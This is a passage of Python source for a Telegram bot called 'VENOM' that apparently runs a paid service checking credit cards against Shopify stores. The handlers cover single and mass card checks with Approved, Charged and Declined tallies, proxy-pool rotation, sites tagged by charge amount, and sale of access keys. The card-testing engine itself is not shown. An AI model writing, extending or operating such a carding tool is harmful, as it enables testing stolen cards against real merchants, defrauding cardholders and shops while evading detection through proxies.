        await event.answer("❌ Admin only!", alert=True); return
    sites = load_sites()
    if not sites:
        await event.answer("📋 No sites.", alert=True); return
    lines = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(sites[:30])])
    note  = f"\n<i>...and {len(sites)-30} more. Use /listsites for full list.</i>" if len(sites) > 30 else ""
    text  = pe(f"<b>🌐 Sites ({len(sites)}):</b>\n\n{lines}{note}\n\n<b>{SEP}</b>\n{DEV_LINE}")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())

@bot.on(events.CallbackQuery(pattern=b"admin_list_proxy_cb"))
async def cb_admin_list_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    pool = load_proxies()
    if not pool:
        await event.answer("📋 Pool is empty.", alert=True); return
    lines = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(pool[:20])])
    note  = f"\n<i>...and {len(pool)-20} more. Use /getproxy for full list.</i>" if len(pool) > 20 else ""
    text  = pe(f"<b>⚙️ Proxy Pool ({len(pool)}):</b>\n\n{lines}{note}\n\n<b>{SEP}</b>\n{DEV_LINE}")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())

@bot.on(events.CallbackQuery(pattern=b"admin_genkeys_info"))
async def cb_admin_genkeys_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("🔑 Send: /genkeys [count] [days]\nExample: /genkeys 5 30", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_list_keys_cb"))
async def cb_admin_list_keys(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    unused = [(k,v) for k,v in _keys_data.items() if v.get('redeemed_by') is None][:15]
    if not unused:
        await event.answer("📋 No unused keys.", alert=True); return
    lines = "\n".join([f"🟢 <code>{k}</code> — {v.get('plan_days','?')}d" for k,v in unused])
    text  = pe(f"<b>🔑 Unused Keys ({len(unused)}):</b>\n\n{lines}\n\n<b>{SEP}</b>\n{DEV_LINE}")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_keys())

@bot.on(events.CallbackQuery(pattern=b"admin_delkey_info"))
async def cb_admin_delkey_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("🔥 Send: /delkey [key_string]", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_add_user_info"))
async def cb_admin_add_user_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("✅ Send: /authuser [user_id] [days]", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_rm_user_info"))
async def cb_admin_rm_user_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("🔥 Send: /deauthuser [user_id]", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_add_site_info"))
async def cb_admin_add_site_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("✅ Send: /addsite [url]", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_rm_site_info"))
async def cb_admin_rm_site_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("🔥 Send: /rmsite [url]", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_add_proxy_info"))
async def cb_admin_add_proxy_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("✅ Send: /addproxy [ip:port or ip:port:user:pass]", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_clear_proxy_cb"))
async def cb_admin_clear_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    try:
        async with aiofiles.open(PROXY_FILE, 'w') as f: await f.write("")
        await event.answer("🔥 Proxy pool cleared!", alert=True)
    except:
        await event.answer("❌ Failed to clear pool.", alert=True)
    pool   = load_proxies()
    text   = pe(
        f"<b>⚙️ Proxy Pool Management</b>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Pool Size:</b> {len(pool)} proxies\n"
        f"<b>{SEP}</b>\n"
        f"<b>Commands:</b>\n"
        f"<code>/addproxy [proxy]</code> — Add proxy\n"
        f"<code>/rmproxy [proxy]</code> — Remove proxy\n"
        f"<code>/clearproxy</code> — Clear all\n"
        f"<code>/getproxy</code> — Get pool file"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())

@bot.on(events.CallbackQuery(pattern=b"gates"))
async def cb_gates(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Premium required!", alert=True); return
    text = pe(
        f"<b>💎 Shopify Gateway</b>\n\n"
        f"⚡ <b>Single Check</b>\n"
        f"<code>/sh card|mm|yy|cvv</code>\n\n"
        f"⚡ <b>Mass Check</b>\n"
        f"Reply to .txt with <code>/msh</code>\n"
        f"— or <b>send a .txt file directly!</b>"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_gates())

@bot.on(events.CallbackQuery(pattern=b"amount_select"))
async def cb_amount_select(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Premium required!", alert=True); return
    await event.answer()
    cur   = get_user_amount_tier(uid)
    label = AMOUNT_TIERS.get(cur, ('Any',))[0]
    meta  = load_sites_meta()
    sites = load_sites()
    tagged_count = {t: sum(1 for s in sites if meta.get(s,{}).get('tier')==t) for t in AMOUNT_TIERS if t!='any'}
    lines = "\n".join(f"  {v[0]}: {tagged_count.get(k,0)} tagged sites" for k,v in AMOUNT_TIERS.items() if k!='any')
    text = pe(
        f"<b>💰 Amount Filter</b>\n"
        f"<b>{SEP}</b>\n"
        f"Current: <b>{label}</b>\n\n"
        f"<b>Available tiers:</b>\n{lines}\n\n"
        f"<i>Select a tier — checker will only use sites tagged for that price.</i>"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_amount_select(uid))

@bot.on(events.CallbackQuery(pattern=rb"amount_tier_(\w+)"))
async def cb_amount_tier(event):
    uid  = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Premium required!", alert=True); return
    tier = event.data.decode().split("amount_tier_", 1)[1]
    if tier not in AMOUNT_TIERS:
        await event.answer("❌ Invalid tier", alert=True); return
    set_user_amount_tier(uid, tier)
    label = AMOUNT_TIERS[tier][0]
    meta  = load_sites_meta()
    sites = load_sites()
    tagged = sum(1 for s in sites if meta.get(s,{}).get('tier')==tier) if tier != 'any' else len(sites)
    if tagged == 0 and tier != 'any':
        await event.answer(f"⚠️ No sites tagged as {label} yet — ask admin to run /tagsite", alert=True)
    else:
        await event.answer(f"✅ {label} — {tagged} sites will be used for checking", alert=False)
    cur   = get_user_amount_tier(uid)
    cur_label = AMOUNT_TIERS.get(cur, ('Any',))[0]
    tagged_count = {t: sum(1 for s in sites if meta.get(s,{}).get('tier')==t) for t in AMOUNT_TIERS if t!='any'}
    lines = "\n".join(f"  {v[0]}: {tagged_count.get(k,0)} sites" for k,v in AMOUNT_TIERS.items() if k!='any')
    active_count = tagged_count.get(cur, len(sites)) if cur != 'any' else len(sites)
    status_line  = (
        f"⚠️ <b>0 sites tagged as {cur_label}</b> — checks will fail until admin tags sites.\n"
        if active_count == 0 and cur != 'any'
        else f"✅ Your checks will run on <b>{active_count} {cur_label} site{'s' if active_count!=1 else ''}</b>.\n"
    )
    text = pe(
        f"<b>💰 Amount Filter</b>\n"
        f"<b>{SEP}</b>\n"
        f"Selected: <b>{cur_label}</b>\n"
        f"{status_line}\n"
        f"<b>Tagged sites per tier:</b>\n{lines}\n\n"
        f"<i>Tap a tier to switch. Your next /sh or /msh will only check those sites.</i>"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_amount_select(uid))

@bot.on(events.CallbackQuery(pattern=b"manage_proxy"))
async def cb_manage_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Premium required!", alert=True); return
    user_proxy = get_user_proxy(uid)
    pool       = load_proxies()
    if user_proxy:
        proxy_status = f"✅ <b>Your Proxy:</b>\n<blockquote><code>{user_proxy}</code></blockquote>"
    else:
        proxy_status = f"❌ <b>No Personal Proxy Set</b>"
    text = pe(
        f"<b>🔌 Proxy Settings</b>\n"
        f"<b>{SEP}</b>\n"
        f"{proxy_status}\n\n"
        f"📋 <b>Pool:</b> {len(pool)} proxies\n"
        f"<b>{SEP}</b>\n"
        f"<b>👩‍💻 Set Your Proxy:</b>\n"
        f"<code>/setproxy ip:port</code>\n"
        f"<code>/setproxy ip:port:user:pass</code>\n"
        f"<code>/setproxy socks5://ip:port</code>\n"
        f"<code>/setproxy http://user:pass@ip:port</code>"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"back_start"))
async def cb_back_start(event):
    uid = event.sender_id
    try:
        sender    = await bot.get_entity(uid)
        username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
        firstname = sender.first_name or "User"
    except:
        username  = f"ID:{uid}"
        firstname = "User"
    tier    = get_user_tier(uid)
    trem    = time_remaining(uid)
    if is_admin(uid):          status_line = "👑 Admin"
    elif tier == "auth":       status_line = f"✅ Auth — {trem} left"   if trem else "⚠️ Auth Expired"
    elif tier == "grant":      status_line = f"💎 Grant — {trem} left"  if trem else "⚠️ Grant Expired"
    elif tier == "key":        status_line = f"🔑 Key — {trem} left"    if trem else "⚠️ Key Expired"
    elif tier:                 status_line = "⭐ Premium"
    else:                      status_line = "🚫 No Access"
    lim = get_user_limit(uid)
    text = pe(
        f"<b>VENOM</b>\n"
        f"<b>{SEP}</b>\n"
        f"👤 <b>User:</b> {firstname}\n"
        f"🔗 <b>Handle:</b> {username}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
        f"<b>{SEP}</b>\n"
        f"⚡ <b>Status:</b> {status_line}\n"
        f"📋 <b>Limit:</b> {lim if lim else 'N/A'} cards/file\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    kb_rows = rows_main()
    if is_admin(uid):
        kb_rows = [
            [{"text": "🏧  Gates",       "callback_data": "gates"},
             {"text": "👑  Admin Panel", "callback_data": "admin_panel"}],
            [{"text": "💙  Contact", "url": f"https://t.me/{OWNER_USERNAME}"},
             {"text": "❌  Close",   "callback_data": "close"}],
        ]
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, kb_rows)

@bot.on(events.CallbackQuery(pattern=b"close"))
async def cb_close(event):
    try: await event.delete()
    except: await event.answer("✅ Closed")

@bot.on(events.CallbackQuery(pattern=b"toggle_pool"))
async def cb_toggle_pool(event):
    uid     = event.sender_id
    current = user_pool_enabled.get(uid, True)
    user_pool_enabled[uid] = not current
    save_user_pool()
    state   = "ON ✅" if not current else "OFF 🚀"
    await event.answer(f"Proxy Pool {state}", alert=False)
    user_proxy = get_user_proxy(uid)
    pool       = load_proxies()
    if user_proxy:
        proxy_status = f"✅ <b>Your Proxy:</b>\n<blockquote><code>{user_proxy}</code></blockquote>"
    else:
        proxy_status = f"❌ <b>No Personal Proxy Set</b>"
    text = pe(
        f"<b>🔌 Proxy Settings</b>\n"
        f"<b>{SEP}</b>\n"
        f"{proxy_status}\n\n"
        f"📋 <b>Pool:</b> {len(pool)} proxies\n"
        f"<b>{SEP}</b>\n"
        f"<b>👩‍💻 Set Your Proxy:</b>\n"
        f"<code>/setproxy ip:port</code>\n"
        f"<code>/setproxy ip:port:user:pass</code>\n"
        f"<code>/setproxy socks5://ip:port</code>\n"
        f"<code>/setproxy http://user:pass@ip:port</code>"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"test_proxy_btn"))
async def cb_test_proxy(event):
    uid = event.sender_id
    proxy = get_user_proxy(uid)
    if not proxy:
        proxies = load_proxies()
        if not proxies:
            await event.answer("❌ No proxies to test!", alert=True); return
        proxy = proxies[0]
    await event.answer("⚡ Testing proxy...", alert=False)
    r = await test_proxy(proxy)
    if r['status'] == 'alive':
        ip = await get_proxy_ip(proxy)
        ip_line = f"\n🌐 <b>IP:</b> <code>{ip}</code>" if ip else ""
        await bot.send_message(uid, pe(f"<b>Proxy Test:</b>\n✅ ALIVE{ip_line}\n<code>{proxy}</code>"), parse_mode='html')
    else:
        await bot.send_message(uid, pe(f"<b>Proxy Test:</b>\n❌ DEAD\n<code>{proxy}</code>"), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"remove_proxy_btn"))
async def cb_remove_proxy(event):
    uid = event.sender_id
    user_proxy = get_user_proxy(uid)
    if user_proxy:
        remove_user_proxy(uid)
        await event.answer("✅ Your proxy removed!", alert=False)
        await bot.send_message(uid, pe(f"🗑️ <b>Your proxy removed:</b>\n<code>{user_proxy}</code>"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.answer("❌ No proxies!", alert=True); return
    removed = proxies[0]
    async with aiofiles.open(PROXY_FILE,'w') as f:
        for p in proxies[1:]: await f.write(f"{p}\n")
    await event.answer("✅ Removed!", alert=False)
    await bot.send_message(uid, pe(f"🗑️ <b>Proxy removed from pool:</b>\n<code>{removed}</code>"), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"stop_mass"))
async def cb_stop_mass(event):
    uid = event.sender_id
    sk  = f"{uid}_{event.message_id}"
    if sk in active_sessions:
        del active_sessions[sk]
        await event.answer("🛑 Stopping...")
        try: await event.edit(pe("🚫 <b>Check stopped by user.</b>"), parse_mode='html')
        except: pass
    else: await event.answer("Already stopped.", alert=False)


@bot.on(events.CallbackQuery(pattern=rb"start_check_(\d+)"))
async def cb_start_check(event):
    uid  = event.sender_id
    data = pending_checks.get(uid)
    if not data:
        await event.answer("❌ Session expired. Send the file again.", alert=True); return
    cards = data['cards']
    del pending_checks[uid]
    await event.answer(f"⚡ Starting check for {len(cards)} cards!")
    queued_msg_id = event.message_id
    try:
        await event.edit(pe(f"<b>🎯 Queued {len(cards)} cards!</b>\n⚡ Starting..."), parse_mode='html')
    except: pass
    sites, _eff_tier_cb = load_sites_for_user(uid)
    proxies = get_proxies_for_user(uid) or load_proxies()
    _tier_cb      = get_user_amount_tier(uid)
    _rlabel_cb    = tier_range_label(_eff_tier_cb)
    if not sites:
        await bot.send_message(uid, pe("❌ No sites configured. Contact admin."), parse_mode='html'); return
    if not proxies:
        await bot.send_message(uid, pe("❌ No proxies configured. Contact admin."), parse_mode='html'); return
    _CB_SEP   = "\u25b0" * 20
    _CB_TOT   = '<tg-emoji emoji-id="5298970748172385213">\u2b50</tg-emoji>'
    _CB_CHK   = '<tg-emoji emoji-id="6267229004311303657">\u2b50</tg-emoji>'
    _CB_APP   = '<tg-emoji emoji-id="6267118537752450044">\u2b50</tg-emoji>'
    _CB_DCL   = '<tg-emoji emoji-id="6264989883241076562">\u2b50</tg-emoji>'
    _CB_CHG   = '<tg-emoji emoji-id="6266905086467773719">\u2b50</tg-emoji>'
    _cb_bar   = "\u2591" * 18 + "  0%"
    text = (
        f"\u2b50 <b>{fi('Shopify Mass Check')}</b>\n"
        f"<b>{_CB_SEP}</b>\n"
        f"  <code>{_cb_bar}</code>\n\n"
        f"{_CB_TOT}  <b>{fi('Total')}</b>      \u27b6  {len(cards)}\n"
        f"{_CB_CHK}  <b>{fi('Checked')}</b>    \u27b6  0\n"
        f"{_CB_APP}  <b>{fi('Approved')}</b>   \u27b6  0\n"
        f"{_CB_DCL}  <b>{fi('Declined')}</b>   \u27b6  0\n"
        f"{_CB_CHG}  <b>{fi('Charged')}</b>    \u27b6  0\n"
        f"<b>{_CB_SEP}</b>"
    )
    try:
        await asyncio.to_thread(_raw_post, f"{TG_API}/deleteMessage",
            {"chat_id": uid, "message_id": queued_msg_id})
    except: pass
    msg_id = await raw_send(uid, text, rows_stop())
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id))

# ─── /mcancel ──────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/mcancel$'))
async def mcancel_command(event):
    uid      = event.sender_id
    canceled = False
    for k in list(active_sessions):
        if k.startswith(f"{uid}_"):
            del active_sessions[k]
            canceled = True
    await event.reply(
        pe("✅ <b>Mass check cancelled.</b>" if canceled else "❌ <b>No active mass check.</b>"),
        parse_mode='html'
    )

# ─── /profile ──────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/profile$'))
async def profile_command(event):
    uid = event.sender_id
    if not (is_admin(uid) or is_premium_user(uid) or is_auth_user(uid)):
        await event.reply(pe("❌ <b>Access required.</b>"), parse_mode='html')
        return
    try:
        sender = await event.get_sender()
        uname  = f"@{sender.username}" if sender.username else f"user_{uid}"
        fname  = sender.first_name or "User"
    except Exception:
        uname, fname = f"user_{uid}", "User"

    try:
        with open("user_stats.json") as _f:
            ustats = json.load(_f)
        u = ustats.get(str(uid), {})
        total_checks = u.get('total_checks', 0)
        hits         = u.get('charged', 0) + u.get('approved', 0)
        joined       = u.get('first_seen', '-')[:10]
    except Exception:
        total_checks, hits, joined = 0, 0, '-'

    sites_cnt   = len(load_sites())
    proxies_cnt = len(load_proxies())
    plan = 'Admin' if is_admin(uid) else ('Premium' if is_premium_user(uid) else 'Authorized')
    SEP_P = '\u2501' * 22

    text = (
        f"<b>{SEP_P}</b>\n"
        f"\U0001f464 <b>Profile</b>\n"
        f"<b>{SEP_P}</b>\n\n"
        f"<b>ID        \u00bb</b>  <code>{uid}</code>\n"
        f"<b>Name      \u00bb</b>  {html.escape(fname)}\n"
        f"<b>Username  \u00bb</b>  {html.escape(uname)}\n"
        f"<b>Plan      \u00bb</b>  {plan}\n"
        f"<b>Joined    \u00bb</b>  {joined}\n"
        f"<b>Checks    \u00bb</b>  {total_checks}\n"
        f"<b>Hits      \u00bb</b>  {hits}\n"
        f"<b>Sites     \u00bb</b>  {sites_cnt}\n"
        f"<b>Proxies   \u00bb</b>  {proxies_cnt}\n\n"
        f"<b>{SEP_P}</b>"
    )
    await event.reply(pe(text), parse_mode='html')

# ─── /mysites ──────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def mysites_command(event):
    uid = event.sender_id
    if not (is_admin(uid) or is_premium_user(uid) or is_auth_user(uid)):
        await event.reply(pe("❌ <b>Access required.</b>"), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(pe("❌ <b>No sites saved.</b>"), parse_mode='html')
        return
    meta  = load_site_meta()
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"sites_{uid}_{ts}.txt"
    try:
        async with aiofiles.open(fname, 'w') as _f:
            await _f.write("=" * 60 + "\n")
            await _f.write(f"SITES ({len(sites)}) — Generated {datetime.now().strftime('%d/%m/%Y %H:%M')}\n")
            await _f.write("=" * 60 + "\n")
            await _f.write("Site | Gateway | Price | Response | Last Checked\n")
            await _f.write("-" * 60 + "\n\n")
            for i, s in enumerate(sites, 1):
                m    = meta.get(s, {})
                line = (f"{i:>3}. {s} | {m.get('gateway','-')} | "
                        f"{m.get('price','-')} | {m.get('response','-')} | {m.get('checked','-')}\n")
                await _f.write(line)
        await bot.send_file(
            uid, fname,
            caption=pe(f"\U0001f310 <b>Your Sites ({len(sites)})</b>\nGateway \u00b7 Price \u00b7 Last Response"),
            parse_mode='html'
        )
    except Exception as e:
        await event.reply(pe(f"❌ Error: <code>{html.escape(str(e)[:100])}</code>"), parse_mode='html')
    finally:
        try: os.remove(fname)
        except: pass

# ─── /stats (admin) ────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/stats$'))
async def stats_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html')
        return
    try:
        with open("users.json") as _f:
            users_db = json.load(_f)
        total_users = len(users_db)
    except Exception:
        total_users = 0
    try:
        with open("user_stats.json") as _f:
            ustats = json.load(_f)
        total_checks = sum(v.get('total_checks', 0) for v in ustats.values())
        total_hits   = sum(v.get('charged', 0) + v.get('approved', 0) for v in ustats.values())
    except Exception:
        total_checks, total_hits = 0, 0

    sites_l   = load_sites()
    proxies_l = load_proxies()
    active    = len(active_sessions)
    SEP_S     = '\u2501' * 22

    text = (
        f"<b>{SEP_S}</b>\n"
        f"\U0001f4ca <b>Bot Statistics</b>\n"
        f"<b>{SEP_S}</b>\n\n"
        f"\U0001f465 Total users   \u00bb  <b>{total_users}</b>\n"
        f"\U0001f310 Active sites  \u00bb  <b>{len(sites_l)}</b>\n"
        f"\U0001f50c Proxies       \u00bb  <b>{len(proxies_l)}</b>\n"
        f"\U0001f4b3 Total checks  \u00bb  <b>{total_checks}</b>\n"
        f"\U0001f525 Total hits    \u00bb  <b>{total_hits}</b>\n"
        f"\u26a1 Active checks \u00bb  <b>{active}</b>\n\n"
        f"\U0001f916 Status: Running \u2705\n"
        f"<b>{SEP_S}</b>"
    )
    await event.reply(pe(text), parse_mode='html')

# ─── /getsites (admin) ─────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/getsites$'))
async def getsites_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(pe("❌ <b>sites.txt is empty.</b>"), parse_mode='html')
        return
    if len(sites) <= 30:
        site_list = "\n".join([f"{i+1}. <code>{html.escape(s)}</code>" for i, s in enumerate(sites)])
        await event.reply(pe(f"\U0001f310 <b>Sites ({len(sites)}):</b>\n\n{site_list}"), parse_mode='html')
    else:
        ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
        gs_fname = f"all_sites_{ts}.txt"
        with open(gs_fname, 'w') as _f:
            _f.write("\n".join(sites))
        await bot.send_file(
            uid, gs_fname,
            caption=pe(f"\U0001f310 <b>All Sites ({len(sites)})</b>"),
            parse_mode='html'
        )
        try: os.remove(gs_fname)
        except: pass


# ─── Mandatory Sub: re-check callback ─────────────────────────────────────────
@bot.on(events.CallbackQuery(pattern=b"check_sub_again"))
async def cb_check_sub_again(event):
    uid = event.sender_id
    missing = await check_user_subscribed(uid)
    if not missing:
        await event.answer("✅ You're subscribed! You can now use the bot.", alert=False)
        try:
            await event.delete()
        except Exception:
            pass
        return
    ch_lines = "\n".join(f"  {EM_SUB_PANEL} <a href='{c['url']}'>{html.escape(c.get('title','Channel'))}</a>" for c in missing)
    text = pe(
        f"<b>🔒 Still Not Subscribed</b>\n"
        f"<b>{SEP}</b>\n"
        f"You still haven't subscribed to:\n\n"
        f"{ch_lines}\n\n"
        f"<b>{SEP}</b>\n"
        f"Subscribe then tap the button again ↓"
    )
    await event.answer("❌ You still need to subscribe!", alert=True)
    try:
        await event.edit(text, parse_mode='html', buttons=make_markup(build_sub_gate_keyboard(missing)))
    except Exception:
        pass

# ─── Admin: /addsub  /rmsub  /listsubs ─────────────────────────────────────────
# Two-step flow:
#   Step 1 → admin sends /addsub  → bot asks to forward a message from the channel
#   Step 2 → admin forwards any message from that channel → bot detects the channel ID
#            and asks for the t.me link
#   Step 3 → admin sends the t.me link → channel saved

_addsub_state: dict = {}   # uid → {"step": 1|2, "ch_id": int, "ch_title": str}

@bot.on(events.NewMessage(pattern=r'^/addsub$'))
async def addsub_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    _addsub_state[uid] = {"step": 1}
    await event.reply(pe(
        f"<b>📢 Add Mandatory Channel — Step 1/2</b>\n"
        f"<b>{SEP}</b>\n"
        f"قم بتوجيه (Forward) أي رسالة من القناة التي تريد إضافتها ↓\n\n"
        f"<i>• تأكد أن البوت مضاف كأدمن في القناة\n"
        f"• أرسل /cancel لإلغاء العملية</i>"
    ), parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.is_private and e.forward is not None))
async def addsub_forward_step(event):
    uid = event.sender_id
    if not is_admin(uid):
        return
    state = _addsub_state.get(uid)
    if not state or state.get("step") != 1:
        return

    # Extract channel ID from forwarded message
    fwd = event.forward
    ch_id    = None
    ch_title = ""

    try:
        # fwd.chat_id is available when the source is a public/private channel
        if hasattr(fwd, 'chat_id') and fwd.chat_id:
            ch_id = fwd.chat_id
        elif hasattr(fwd, 'from_id') and fwd.from_id:
            from telethon.tl.types import PeerChannel
            peer = fwd.from_id
            if hasattr(peer, 'channel_id'):
                ch_id = int(f"-100{peer.channel_id}")
    except Exception:
        pass

    if not ch_id:
        await event.reply(pe(
            "❌ <b>Could not extract channel ID.</b>\n\n"
            "Make sure you forwarded a message from a <b>channel</b>, not a group or user.\n"
            "Try again or send /cancel to abort."
        ), parse_mode='html')
        return

    # Try to get channel title
    try:
        entity   = await bot.get_entity(ch_id)
        ch_title = getattr(entity, 'title', '') or ''
    except Exception:
        ch_title = f"Channel {ch_id}"

    # Check not already added
    channels = load_mandatory_channels()
    if any(c['id'] == ch_id for c in channels):
        del _addsub_state[uid]
        await event.reply(pe(
            f"⚠️ <b>Channel already exists!</b>\n"
            f"📢 <b>{html.escape(ch_title)}</b> — <code>{ch_id}</code>"
        ), parse_mode='html')
        return

    # Move to step 2 — ask for t.me link
    _addsub_state[uid] = {"step": 2, "ch_id": ch_id, "ch_title": ch_title}
    await event.reply(pe(
        f"{EM_SUB_ADD} <b>Add Channel — Step 2/2</b>\n"
        f"<b>{SEP}</b>\n"
        f"✅ <b>Channel detected:</b>\n"
        f"📢 <b>{html.escape(ch_title)}</b>\n"
        f"🆔 <code>{ch_id}</code>\n\n"
        f"<b>Now send the channel link:</b>\n"
        f"<code>t.me/channelname</code>\n\n"
        f"<i>Send /cancel to abort</i>"
    ), parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.is_private and e.text and not e.text.startswith('/')))
async def addsub_url_step(event):
    uid = event.sender_id
    if not is_admin(uid):
        return
    state = _addsub_state.get(uid)
    if not state or state.get("step") != 2:
        return

    raw = event.text.strip()
    # Accept t.me/xxx or https://t.me/xxx or @xxx
    if raw.startswith('@'):
        ch_url = f"https://t.me/{raw.lstrip('@')}"
    elif raw.startswith('t.me/') or raw.startswith('https://t.me/'):
        ch_url = raw if raw.startswith('https://') else f"https://{raw}"
    else:
        await event.reply(pe(
            "❌ <b>Invalid link.</b>\n\n"
            "Send the link in this format:\n"
            "<code>t.me/channelname</code>"
        ), parse_mode='html')
        return

    ch_id    = state["ch_id"]
    ch_title = state["ch_title"]

    channels = load_mandatory_channels()
    channels.append({"id": ch_id, "url": ch_url, "title": ch_title})
    save_mandatory_channels(channels)
    del _addsub_state[uid]

    await event.reply(pe(
        f"✅ <b>Channel Added!</b>\n"
        f"<b>{SEP}</b>\n"
        f"📢 <b>Channel:</b> {html.escape(ch_title)}\n"
        f"🔗 <b>Link:</b> {ch_url}\n"
        f"🆔 <b>ID:</b> <code>{ch_id}</code>\n"
        f"<b>{SEP}</b>\n"
        f"🔒 Users must now subscribe before using the bot."
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cancel$'))
async def cancel_addsub(event):
    uid = event.sender_id
    if uid in _addsub_state:
        del _addsub_state[uid]
        await event.reply(pe("❌ <b>Operation cancelled.</b>"), parse_mode='html')
    else:
        await event.reply(pe("No active operation to cancel."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmsub(\s+.*)?$'))
async def rmsub_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.strip().split()
    channels = load_mandatory_channels()
    if len(parts) < 2:
        if not channels:
            await event.reply(pe("📋 No mandatory channels set."), parse_mode='html'); return
        lines = "\n".join(f"{i+1}. <code>{c['id']}</code> — {html.escape(c.get('title','?'))} | {c.get('url','')}" for i, c in enumerate(channels))
        await event.reply(pe(
            f"<b>📢 Mandatory Channels ({len(channels)}):</b>\n\n{lines}\n\n"
            f"<b>Remove:</b> <code>/rmsub [channel_id]</code>"
        ), parse_mode='html'); return
    try:
        ch_id = int(parts[1])
    except ValueError:
        await event.reply(pe("❌ <b>Invalid channel ID.</b>"), parse_mode='html'); return
    before = len(channels)
    channels = [c for c in channels if c['id'] != ch_id]
    if len(channels) == before:
        await event.reply(pe(f"❌ Channel <code>{ch_id}</code> not found in the list."), parse_mode='html'); return
    save_mandatory_channels(channels)
    await event.reply(pe(f"✅ <b>Channel <code>{ch_id}</code> removed from mandatory subscriptions.</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/listsubs$'))
async def listsubs_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    channels = load_mandatory_channels()
    if not channels:
        await event.reply(pe(
            f"<b>📢 Mandatory Subscriptions</b>\n"
            f"<b>{SEP}</b>\n"
            f"No channels set.\n\n"
            f"<b>Add one:</b>\n"
            f"<code>/addsub -100XXXXXXXXX https://t.me/chan Title</code>"
        ), parse_mode='html'); return
    lines = "\n".join(
        f"{i+1}. <a href='{c['url']}'>{html.escape(c.get('title','Channel'))}</a> — <code>{c['id']}</code>"
        for i, c in enumerate(channels)
    )
    await event.reply(pe(
        f"<b>📢 Mandatory Channels ({len(channels)}):</b>\n\n"
        f"{lines}\n\n"
        f"<b>{SEP}</b>\n"
        f"<b>Remove:</b> <code>/rmsub [channel_id]</code>\n"
        f"<b>Add:</b> <code>/addsub -100XXXXXXXXX https://t.me/chan Title</code>"
    ), parse_mode='html')

# ─── Admin callback: mandatory sub panel ────────────────────────────────────────
EM_SUB_PANEL = '<tg-emoji emoji-id="6266818250818983044">📢</tg-emoji>'
EM_SUB_ADD   = '<tg-emoji emoji-id="6267115986541877538">⭐</tg-emoji>'
